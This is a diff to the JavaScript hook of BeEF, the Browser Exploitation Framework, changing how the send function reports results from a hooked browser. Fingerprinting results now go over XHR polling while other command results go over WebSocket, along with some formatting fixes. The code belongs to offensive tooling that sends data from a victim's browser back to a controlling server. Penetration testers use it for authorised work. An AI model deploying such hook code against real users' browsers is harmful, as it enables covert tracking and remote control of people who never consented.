@@ -76,22 +76,21 @@ beef.net = {
         }
     },
 
-    //Queues the current command and flushes the queue straight away
+    // Queues the current command and flushes the queue straight away.
+    // Always send Browser Fingerprinting results (beef.net.browser_details(); -> /init handler) using normal XHR-polling.
     send:function (handler, cid, results, callback) {
-        if (typeof beef.websocket === "undefined") {
+        if (typeof beef.websocket === "undefined" || (handler === "/init" && cid == 0)) {
             this.queue(handler, cid, results, callback);
             this.flush();
-        }
-        else {
+        }else {
             try {
                 beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
                     '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
                     '","callback": "' + callback + '","bh":"' + beef.session.get_hook_session_id() + '" }');
-            }
-            catch (e) {
+            }catch (e) {
                 this.queue(handler, cid, results, callback);
                 this.flush();
-                }
+            }
         }
     },
 
